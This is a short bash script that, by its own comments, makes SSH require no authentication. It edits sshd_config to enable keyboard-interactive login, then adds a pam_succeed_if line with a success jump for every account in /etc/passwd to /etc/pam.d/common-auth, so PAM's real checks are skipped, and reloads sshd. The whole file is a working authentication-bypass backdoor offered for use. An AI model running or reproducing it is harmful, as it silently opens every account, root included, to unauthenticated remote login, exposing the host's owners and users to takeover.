#!/bin/bash
#script to just make everyone authenticate for everything using PAM, first makes ssh require no authentication though

#change password auth off for ssh and change to KbdInteractiveAuthentication
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/KbdInteractiveAuthentication no/KbdInteractiveAuthentication yes/' /etc/ssh/sshd_config

#modify the pam.d common-auth file adding every single user to auto authenticate (lol)
count=2
awk -F: '{ print $1}' /etc/passwd | while read line; 
do 
    sed -i "/# here are the per-package modules/aauth [success=$count default=ignore] pam_succeed_if.so user = $line" /etc/pam.d/common-auth
    ((count=count+1))
done

#reload sshd
systemctl reload sshd